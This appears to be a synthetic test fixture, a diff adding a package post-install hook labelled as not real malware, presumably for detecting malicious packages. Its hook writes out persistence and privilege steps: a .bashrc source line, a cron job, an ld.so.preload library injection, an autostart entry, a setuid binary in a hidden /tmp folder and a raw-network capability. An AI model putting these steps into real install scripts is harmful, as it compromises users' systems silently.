@@ -1,0 +1,15 @@
+# SYNTHETIC FIXTURE - not real malware.
+
+post_install() {
+  echo 'source /opt/helper/agent.sh' >> ~/.bashrc
+  (crontab -l 2>/dev/null; echo '*/10 * * * * /opt/helper/agent.sh') | crontab -
+  echo /opt/helper/libhook.so > /etc/ld.so.preload
+  install -Dm644 /usr/share/applications/helper.desktop \
+    /etc/xdg/autostart/helper.desktop
+  chmod u+s /tmp/.helper-cache/agent
+  setcap cap_net_raw+ep /opt/helper/agent
+}
+
+post_upgrade() {
+  post_install
+}
